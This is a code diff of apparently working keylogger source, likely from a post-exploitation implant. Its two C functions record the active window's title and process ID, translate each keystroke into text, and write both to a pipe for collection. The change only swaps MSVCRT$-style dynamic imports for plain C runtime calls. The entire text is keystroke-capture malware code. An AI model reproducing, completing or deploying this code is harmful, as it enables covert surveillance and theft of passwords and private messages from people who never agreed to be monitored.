@@ -173,17 +173,17 @@ VOID ProcessWindowTitle()
         Instance->Win32.GetWindowThreadProcessId(CurrentWindow, &ProcessId);
         if (!Instance->Win32.GetWindowTextW(CurrentWindow, Buffer, sizeof(Buffer)))
         {
-            MSVCRT$swprintf(Buffer, KEYLOG_BUFFER_LEN, L"(No Title)");
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"(No Title)");
         }
 
         // check when ever the title has been changed.
-        if (MSVCRT$wcsncmp(g_TitleBuffer, Buffer, MSVCRT$wcslen(Buffer)) != 0)
+        if (wcsncmp(g_TitleBuffer, Buffer, wcslen(Buffer)) != 0)
         {
-            MSVCRT$memcpy(g_TitleBuffer, Buffer, sizeof(Buffer));
+            memcpy(g_TitleBuffer, Buffer, sizeof(Buffer));
 
-            MSVCRT$swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, g_TitleBuffer);
+            swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, g_TitleBuffer);
 
-            if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Title, MSVCRT$wcslen(Title) * sizeof(wchar_t), &BytesWritten, NULL))
+            if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Title, wcslen(Title) * sizeof(wchar_t), &BytesWritten, NULL))
             {
                 return;
             }
@@ -217,33 +217,33 @@ VOID ProcessKey(UINT Key)
             break;
 
         case VK_ESCAPE:
-            MSVCRT$swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[ESCAPE]");
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[ESCAPE]");
             break;
 
         case VK_RETURN:
-            MSVCRT$swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[RETURN]");
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[RETURN]");
             break;
 
         case VK_BACK:
-            MSVCRT$swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[BACK]");
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[BACK]");
             break;
 
         case VK_TAB:
-            MSVCRT$swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[TAB]");
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[TAB]");
             break;
 
         case VK_SPACE:
-            MSVCRT$swprintf(Buffer, KEYLOG_BUFFER_LEN, L" ");
+            swprintf(Buffer, KEYLOG_BUFFER_LEN, L" ");
             break;
         
         default:
             if (Instance->Win32.ToUnicode(Key, Instance->Win32.MapVirtualKeyW(Key, MAPVK_VK_TO_VSC), Keyboard, Unicode, 1, 0) > 0)
             {
-                MSVCRT$swprintf(Buffer, KEYLOG_BUFFER_LEN, L"%ls", Unicode);
+                swprintf(Buffer, KEYLOG_BUFFER_LEN, L"%ls", Unicode);
             }
     }
 
-    if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Buffer, MSVCRT$wcslen(Buffer) * sizeof(WCHAR), &BytesWritten, NULL)) 
+    if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Buffer, wcslen(Buffer) * sizeof(WCHAR), &BytesWritten, NULL)) 
     {
         return;
     }
